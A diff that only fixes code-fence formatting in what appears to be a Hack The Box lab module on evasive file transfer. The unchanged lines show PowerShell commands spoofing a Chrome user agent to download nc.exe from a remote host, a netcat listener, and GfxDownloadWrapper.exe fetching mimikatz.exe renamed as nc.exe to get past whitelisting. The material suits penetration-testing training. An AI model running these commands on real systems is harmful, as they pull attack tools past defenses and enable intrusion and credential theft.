@@ -8,8 +8,7 @@ If diligent administrators or defenders have blacklisted any of these User Agent
 
 #### Listing out User Agents
 
-```
-        powershell
+```powershell
 PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
 
 Name       : InternetExplorer
@@ -34,14 +33,12 @@ Invoking Invoke-WebRequest to download nc.exe using a Chrome User Agent:
 
 #### Request with Chrome User Agent
 
-```
-        powershell
+```powershell
 PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
 PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
 ```
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ nc -lvnp 80
 
 listening on [any] 80 ...
@@ -61,8 +58,7 @@ Application whitelisting may prevent you from using PowerShell or Netcat, and co
 
 #### Transferring File with GfxDownloadWrapper.exe
 
-```
-        powershell
+```powershell
 PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
 ```
 
